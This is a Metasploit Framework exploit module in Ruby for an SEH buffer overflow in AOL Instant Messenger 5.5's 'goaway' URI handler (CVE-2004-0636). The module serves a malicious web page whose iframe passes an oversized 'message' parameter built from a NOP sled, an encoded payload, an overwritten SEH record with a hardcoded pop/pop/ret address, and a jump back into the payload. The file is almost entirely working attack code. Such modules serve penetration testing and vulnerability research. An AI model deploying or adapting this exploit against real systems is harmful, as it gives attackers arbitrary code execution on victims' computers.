##
# $Id: aim_goaway.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	#
	# This module acts as an HTTP server and exploits an SEH overwrite
	#
	include Msf::Exploit::Seh
	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'AOL Instant Messenger goaway Overflow',
			'Description'    => %q{
					This module exploits a flaw in the handling of AOL Instant
				Messenger's 'goaway' URI handler.  An attacker can execute
				arbitrary code by supplying a overly sized buffer as the
				'message' parameter.  This issue is known to affect AOL Instant
				Messenger 5.5.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'skape',
					'thief <thief@hick.org>'
				],
			'Version'        => '$Revision: 9669 $',
			'References'     =>
				[
					[ 'CVE', '2004-0636' ],
					[ 'OSVDB', '8398'    ],
					[ 'BID', '10889'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=121&type=vulnerabilities' ],
				],
			'Payload'        =>
				{
					'Space'    => 1014,
					'MaxNops'  => 1014,
					'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					# Target 0: Automatic
					[
						'Windows NT/2000/XP/2003 Automatic',
						{
							'Platform' => 'win',
							'Rets'     =>
								[
									0x1108118f, # proto.com: pop/pop/ret
								],
						},
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 09 2004'))
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Build out the message
		msg =
			make_nops(1014 - p.encoded.length) +     # NOP sled before the payload
			p.encoded +                              # store the payload
			generate_seh_record(target['Rets'][0]) + # set up the SEH frame
			"\x90\xe9\x13\xfc\xff\xff"               # jmp -1000

		# Build the HTML content
		content = "<html><iframe src='aim:goaway?message=#{msg}'></html>"

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
